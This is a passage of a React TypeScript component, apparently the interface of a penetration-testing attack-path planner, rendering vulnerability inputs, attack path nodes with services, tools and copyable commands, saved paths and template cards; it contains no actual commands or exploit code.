                          className="flex-1 bg-ghost-surface border border-ghost-border rounded px-1 py-0.5 text-ghost-text text-xs focus:outline-none focus:ring-1 focus:ring-ghost-purple"
                          aria-label="Vulnerability name"
                        />
                        <input
                          value={vuln.cve || ''}
                          onChange={(e) => updateVulnerability(idx, 'cve', e.target.value)}
                          placeholder="CVE"
                          className="w-28 bg-ghost-surface border border-ghost-border rounded px-1 py-0.5 text-ghost-text text-xs focus:outline-none focus:ring-1 focus:ring-ghost-purple"
                          aria-label="CVE ID"
                        />
                        <select
                          value={vuln.severity}
                          onChange={(e) => updateVulnerability(idx, 'severity', e.target.value as Vulnerability['severity'])}
                          className="bg-ghost-surface border border-ghost-border rounded px-1 py-0.5 text-xs focus:outline-none"
                          aria-label="Severity"
                        >
                          <option value="critical" className="text-ghost-red">Critical</option>
                          <option value="high" className="text-orange-400">High</option>
                          <option value="medium" className="text-yellow-400">Medium</option>
                          <option value="low" className="text-ghost-green">Low</option>
                        </select>
                        <button
                          onClick={() => removeVulnerability(idx)}
                          className="text-ghost-red hover:text-ghost-red/80 transition-colors"
                          aria-label="Remove vulnerability"
                        >
                          <Trash2 size={12} />
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Generate Button */}
              <button
                onClick={generateAttackPath}
                disabled={isGenerating || scanResult.services.length === 0}
                className="w-full py-3 bg-gradient-to-r from-ghost-purple to-ghost-cyan hover:opacity-90 disabled:opacity-50 rounded-xl text-white font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-ghost-purple/20"
                aria-label="Generate attack path"
              >
                {isGenerating ? (
                  <>
                    <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white"></div>
                    Generating Attack Path...
                  </>
                ) : (
                  <>
                    <Zap size={18} />
                    Generate Attack Path
                  </>
                )}
              </button>
            </div>

            {/* Visualization Panel */}
            <div className="lg:col-span-2" ref={scrollRef}>
              {selectedPath ? (
                <div className="ghost-panel rounded-xl border border-ghost-border bg-ghost-surface/50 overflow-hidden">
                  {/* Path Header */}
                  <div className="p-4 border-b border-ghost-border flex items-center justify-between flex-wrap gap-2">
                    <div className="min-w-0">
                      <h2 className="text-sm font-bold text-ghost-purple flex items-center gap-2">
                        {selectedPath.favorite && <Star size={14} className="text-yellow-400 fill-yellow-400 flex-shrink-0" />}
                        <span className="truncate">{selectedPath.name}</span>
                      </h2>
                      <p className="text-xs text-ghost-text-dim">
                        {selectedPath.nodes.length} nodes · Created: {new Date(selectedPath.createdAt).toLocaleString()}
                      </p>
                    </div>
                    <div className="flex gap-2 flex-wrap">
                      <button
                        onClick={() => toggleFavorite(selectedPath.id)}
                        className={`px-2 py-1 text-xs rounded flex items-center gap-1 transition-colors ${
                          selectedPath.favorite 
                            ? 'text-yellow-400 bg-yellow-400/10 border border-yellow-400/30' 
                            : 'text-ghost-text-dim hover:text-yellow-400 border border-ghost-border hover:border-yellow-400/30'
                        }`}
                        aria-label={selectedPath.favorite ? 'Remove from favorites' : 'Add to favorites'}
                        aria-pressed={selectedPath.favorite}
                      >
                        <Star size={12} />
                        {selectedPath.favorite ? 'Favorited' : 'Favorite'}
                      </button>
                      <button
                        onClick={exportPath}
                        className="px-2 py-1 text-xs bg-ghost-cyan/20 border border-ghost-cyan/30 text-ghost-cyan rounded hover:bg-ghost-cyan/30 transition-colors flex items-center gap-1"
                        aria-label="Export path"
                      >
                        <Download size={12} /> Export
                      </button>
                      <button
                        onClick={() => {
                          setSelectedPath(prev => prev ? { ...prev, completed: !prev.completed } : null)
                          setAttackPaths(prev => prev.map(p => 
                            p.id === selectedPath.id ? { ...p, completed: !p.completed } : p
                          ))
                        }}
                        className={`px-2 py-1 text-xs rounded flex items-center gap-1 transition-colors ${
                          selectedPath.completed 
                            ? 'bg-ghost-green/20 border border-ghost-green/30 text-ghost-green' 
                            : 'bg-ghost-yellow/20 border border-ghost-yellow/30 text-ghost-yellow'
                        }`}
                        aria-label="Toggle completion status"
                        aria-pressed={selectedPath.completed}
                      >
                        {selectedPath.completed ? '✅ Completed' : '⏳ In Progress'}
                      </button>
                      <button
                        onClick={() => setExpandedNodes(prev => {
                          const allExpanded = prev.size === selectedPath.nodes.length
                          return allExpanded ? new Set() : new Set(selectedPath.nodes.map((_, i) => i))
                        })}
                        className="px-2 py-1 text-xs text-ghost-text-dim hover:text-ghost-text border border-ghost-border rounded transition-colors"
                        aria-label={expandedNodes.size === selectedPath.nodes.length ? 'Collapse all' : 'Expand all'}
                      >
                        {expandedNodes.size === selectedPath.nodes.length ? 'Collapse All' : 'Expand All'}
                      </button>
                    </div>
                  </div>

                  {/* Attack Path Visualization */}
                  <div className="p-4 overflow-x-auto max-h-[600px] overflow-y-auto custom-scrollbar">
                    <div className="relative">
                      {selectedPath.nodes.map((node, idx) => (
                        <div key={node.id} className="mb-2">
                          {/* Node */}
                          <div 
                            className={`${getNodeBg(node.type)} border-l-4 ${getNodeColor(node.type)} rounded-r-lg p-3 cursor-pointer hover:brightness-110 transition-all`}
                            onClick={() => toggleNode(idx)}
                            role="button"
                            tabIndex={0}
                            onKeyDown={(e) => e.key === 'Enter' && toggleNode(idx)}
                          >
                            <div className="flex items-center gap-2">
                              <span className="text-lg" aria-hidden="true">{getNodeIcon(node.type)}</span>
                              <div className="flex-1 min-w-0">
                                <div className="flex items-center gap-2 flex-wrap">
                                  <span className={`text-sm font-mono ${getNodeTextColor(node.type)}`}>
                                    {node.label}
                                  </span>
                                  <span className="text-xs text-ghost-text-dim bg-ghost-bg/50 px-2 py-0.5 rounded border border-ghost-border">
                                    {node.type}
                                  </span>
                                  {expandedNodes.has(idx) && (
                                    <span className="text-xs text-ghost-text-dim">▼</span>
                                  )}
                                </div>
                                <div className="text-xs text-ghost-text-dim mt-0.5 truncate">{node.detail}</div>
                              </div>
                              <span className="text-xs text-ghost-text-dim flex-shrink-0">#{idx + 1}</span>
                            </div>
                          </div>

                          {/* Expanded details */}
                          {expandedNodes.has(idx) && (
                            <div className="mt-1 ml-8 p-3 bg-ghost-bg/50 rounded-lg border border-ghost-border space-y-2">
                              {node.services && node.services.length > 0 && (
                                <div>
                                  <div className="text-xs text-ghost-text-dim font-mono mb-1">📡 Services:</div>
                                  {node.services.map((svc, i) => (
                                    <div key={i} className="text-xs text-ghost-cyan font-mono">
                                      {svc.port}/{svc.protocol} - {svc.service} {svc.version}
                                    </div>
                                  ))}
                                </div>
                              )}
                              
                              {node.vulnerabilities && node.vulnerabilities.length > 0 && (
                                <div>
                                  <div className="text-xs text-ghost-text-dim font-mono mb-1">💥 Vulnerabilities:</div>
                                  {node.vulnerabilities.map((v, i) => (
                                    <div key={i} className={`text-xs font-mono ${
                                      v.severity === 'critical' ? 'text-ghost-red' :
                                      v.severity === 'high' ? 'text-orange-400' :
                                      v.severity === 'medium' ? 'text-yellow-400' :
                                      'text-ghost-text-dim'
                                    }`}>
                                      {v.name} {v.cve && `(${v.cve})`}
                                      {v.exploitAvailable && ' 🔥'}
                                    </div>
                                  ))}
                                </div>
                              )}
                              
                              {node.tools && node.tools.length > 0 && (
                                <div>
                                  <div className="text-xs text-ghost-text-dim font-mono mb-1">🔧 Tools:</div>
                                  <div className="flex flex-wrap gap-1">
                                    {node.tools.map((tool, i) => (
                                      <span key={i} className="text-xs bg-ghost-purple/20 text-ghost-purple px-2 py-0.5 rounded border border-ghost-purple/30">
                                        {tool}
                                      </span>
                                    ))}
                                  </div>
                                </div>
                              )}
                              
                              {node.commands && node.commands.length > 0 && (
                                <div>
                                  <div className="text-xs text-ghost-text-dim font-mono mb-1">⌨️ Commands:</div>
                                  {node.commands.map((cmd, i) => (
                                    <div key={i} className="flex items-center gap-2 bg-ghost-bg rounded-lg px-2 py-1 border border-ghost-border">
                                      <code className="text-xs text-ghost-green font-mono flex-1 break-all">{cmd}</code>
                                      <CopyBtn text={cmd} />
                                    </div>
                                  ))}
                                </div>
                              )}
                            </div>
                          )}

                          {/* Edge arrow */}
                          {idx < selectedPath.nodes.length - 1 && (
                            <div className="flex items-center justify-center py-1 text-ghost-text-dim">
                              <div className="flex items-center gap-2 text-xs">
                                <span>↓</span>
                                <span className="text-ghost-border">{selectedPath.edges[idx]?.label || '→'}</span>
                                <span>↓</span>
                              </div>
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Quick Stats */}
                  <div className="p-4 border-t border-ghost-border bg-ghost-bg/30">
                    <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center text-xs">
                      <div>
                        <div className="text-ghost-text-dim">Total Nodes</div>
                        <div className="text-ghost-purple font-bold">{selectedPath.nodes.length}</div>
                      </div>
                      <div>
                        <div className="text-ghost-text-dim">Vulnerabilities</div>
                        <div className="text-ghost-red font-bold">
                          {selectedPath.nodes.filter(n => n.type === 'vuln').length}
                        </div>
                      </div>
                      <div>
                        <div className="text-ghost-text-dim">Exploits</div>
                        <div className="text-yellow-400 font-bold">
                          {selectedPath.nodes.filter(n => n.type === 'exploit').length}
                        </div>
                      </div>
                      <div>
                        <div className="text-ghost-text-dim">Status</div>
                        <div className={selectedPath.completed ? 'text-ghost-green' : 'text-yellow-400'}>
                          {selectedPath.completed ? '✅ Complete' : '⏳ In Progress'}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="ghost-panel rounded-xl border border-ghost-border bg-ghost-surface/50 p-12 text-center">
                  <GitBranch size={48} className="text-ghost-text-dim opacity-30 mx-auto mb-4" />
                  <h3 className="text-lg text-ghost-text mb-2">No Attack Path Generated</h3>
                  <p className="text-ghost-text-dim text-sm">
                    Add target services and vulnerabilities, then click "Generate Attack Path"
                  </p>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Paths Tab */}
        {activeTab === 'paths' && (
          <div className="ghost-panel rounded-xl border border-ghost-border bg-ghost-surface/50 p-6">
            <div className="flex items-center justify-between mb-4 flex-wrap gap-4">
              <h2 className="text-lg font-bold text-ghost-purple">Saved Attack Paths</h2>
              <div className="flex gap-2 flex-wrap">
                <div className="relative">
                  <Search size={14} className="absolute left-2.5 top-1/2 -translate-y-1/2 text-ghost-text-dim" />
                  <input
                    type="text"
                    value={searchTerm}
                    onChange={(e) => setSearchTerm(e.target.value)}
                    placeholder="Search paths..."
                    className="bg-ghost-bg border border-ghost-border rounded-lg pl-8 pr-3 py-1.5 text-sm text-ghost-text focus:outline-none focus:ring-2 focus:ring-ghost-purple placeholder-ghost-text-dim w-32 sm:w-48"
                    aria-label="Search paths"
                  />
                </div>
                <button
                  onClick={() => setShowFavorites(!showFavorites)}
                  className={`px-2 py-1.5 text-xs rounded border transition-colors ${
                    showFavorites 
                      ? 'bg-yellow-400/20 border-yellow-400/30 text-yellow-400' 
                      : 'border-ghost-border text-ghost-text-dim hover:text-ghost-text'
                  }`}
                  aria-label="Toggle favorites filter"
                >
                  <Star size={12} className="inline mr-1" />
                  Favorites
                </button>
                <select
                  value={filterStatus}
                  onChange={(e) => setFilterStatus(e.target.value as 'all' | 'completed' | 'inprogress')}
                  className="bg-ghost-bg border border-ghost-border rounded-lg px-2 py-1.5 text-xs text-ghost-text focus:outline-none focus:ring-2 focus:ring-ghost-purple"
                  aria-label="Filter by status"
                >
                  <option value="all">All</option>
                  <option value="completed">Completed</option>
                  <option value="inprogress">In Progress</option>
                </select>
                <button
                  onClick={exportAllPaths}
                  className="px-3 py-1.5 bg-ghost-cyan/20 border border-ghost-cyan/30 text-ghost-cyan rounded hover:bg-ghost-cyan/30 transition-colors text-sm flex items-center gap-1"
                  aria-label="Export all paths"
                >
                  <Download size={14} /> Export All
                </button>
                <button
                  onClick={clearAllPaths}
                  disabled={attackPaths.length === 0}
                  className="px-3 py-1.5 text-sm text-ghost-red/60 hover:text-ghost-red border border-ghost-red/30 rounded hover:bg-ghost-red/10 transition-colors disabled:opacity-40 disabled:cursor-not-allowed"
                  aria-label="Clear all paths"
                >
                  <Trash2 size={14} className="inline mr-1" />
                  Clear All
                </button>
              </div>
            </div>

            {filteredPaths.length === 0 ? (
              <div className="text-center py-12">
                <GitBranch size={40} className="text-ghost-text-dim opacity-30 mx-auto mb-3" />
                <p className="text-ghost-text-dim">No saved attack paths found</p>
                <p className="text-ghost-text-dimmer text-sm mt-1">
                  {searchTerm || showFavorites || filterStatus !== 'all' 
                    ? 'Try adjusting your filters' 
                    : 'Generate your first attack path to get started'}
                </p>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {filteredPaths.map(path => (
                  <div key={path.id} className="bg-ghost-bg/50 rounded-lg p-4 border border-ghost-border hover:border-ghost-purple/50 transition-all hover:shadow-lg hover:shadow-ghost-purple/5">
                    <div className="flex items-start justify-between">
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2 flex-wrap">
                          <h3 className="text-sm font-bold text-ghost-purple flex items-center gap-1">
                            {path.favorite && <Star size={12} className="text-yellow-400 fill-yellow-400 flex-shrink-0" />}
                            <span className="truncate">{path.name}</span>
                          </h3>
                          {path.completed && (
                            <span className="text-xs bg-ghost-green/20 text-ghost-green px-2 py-0.5 rounded border border-ghost-green/30 flex-shrink-0">
                              ✅ Done
                            </span>
                          )}
                        </div>
                        <div className="flex items-center gap-3 mt-1 text-xs text-ghost-text-dim flex-wrap">
                          <span>{path.nodes.length} nodes</span>
                          <span>•</span>
                          <span>{path.edges.length} connections</span>
                          <span>•</span>
                          <span className="flex items-center gap-1">
                            <Clock size={10} />
                            {new Date(path.createdAt).toLocaleDateString()}
                          </span>
                        </div>
                      </div>
                      <div className="flex gap-1 flex-shrink-0 ml-2">
                        <button
                          onClick={() => toggleFavorite(path.id)}
                          className={`p-1 transition-colors ${
                            path.favorite ? 'text-yellow-400' : 'text-ghost-text-dim hover:text-yellow-400'
                          }`}
                          title={path.favorite ? 'Remove from favorites' : 'Add to favorites'}
                          aria-label={path.favorite ? 'Remove from favorites' : 'Add to favorites'}
                        >
                          <Star size={14} />
                        </button>
                        <button
                          onClick={() => loadPath(path)}
                          className="p-1 text-ghost-text-dim hover:text-ghost-purple transition-colors"
                          title="Load path"
                          aria-label="Load path"
                        >
                          <Play size={14} />
                        </button>
                        <button
                          onClick={() => deletePath(path.id)}
                          className="p-1 text-ghost-text-dim hover:text-ghost-red transition-colors"
                          title="Delete"
                          aria-label="Delete path"
                        >
                          <Trash2 size={14} />
                        </button>
                      </div>
                    </div>
                    {/* Node preview */}
                    <div className="flex flex-wrap gap-1 mt-2">
                      {path.nodes.slice(0, 6).map((node, i) => (
                        <span key={i} className={`text-xs ${getNodeTextColor(node.type)}`}>
                          {getNodeIcon(node.type)}
                        </span>
                      ))}
                      {path.nodes.length > 6 && (
                        <span className="text-xs text-ghost-text-dim">+{path.nodes.length - 6} more</span>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* Templates Tab */}
        {activeTab === 'templates' && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {(Object.entries(ATTACK_TEMPLATES) as [TemplateKey, typeof ATTACK_TEMPLATES[TemplateKey]][]).map(([name, template]) => (
              <div key={name} className={`ghost-panel rounded-xl p-6 border ${template.color} bg-ghost-surface/50 hover:scale-[1.02] transition-all hover:shadow-lg`}>
                <div className="flex items-center gap-3 mb-3">
                  <div className="w-10 h-10 rounded-lg bg-ghost-surface border border-ghost-border flex items-center justify-center text-xl">
                    {template.icon}
                  </div>
                  <div className="min-w-0">
                    <h3 className="font-bold text-ghost-text">{name}</h3>
                    <p className="text-xs text-ghost-text-dim truncate">{template.description}</p>
                  </div>
                </div>
                
                <div className="space-y-1 mb-4">
                  {template.nodes.slice(0, 4).map((node, i) => (
                    <div key={i} className="flex items-center gap-2 text-xs text-ghost-text">
                      <span className="text-ghost-text-dim w-5 flex-shrink-0">{i + 1}.</span>
                      <span aria-hidden="true">{getNodeIcon(node.type)}</span>
                      <span className="truncate">{node.label}</span>
                    </div>
                  ))}
                  {template.nodes.length > 4 && (
                    <div className="text-xs text-ghost-text-dim">+{template.nodes.length - 4} more steps</div>
                  )}
                </div>
                
                <button
                  onClick={() => generateFromTemplate(name)}
                  disabled={isGenerating}
                  className="w-full py-2 bg-gradient-to-r from-ghost-cyan to-ghost-purple hover:opacity-90 disabled:opacity-50 rounded-lg text-white text-sm font-medium flex items-center justify-center gap-2 transition-all shadow-lg shadow-ghost-cyan/20"
                  aria-label={`Generate ${name} path`}
                >
                  <Zap size={14} />
                  Generate This Path
                </button>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}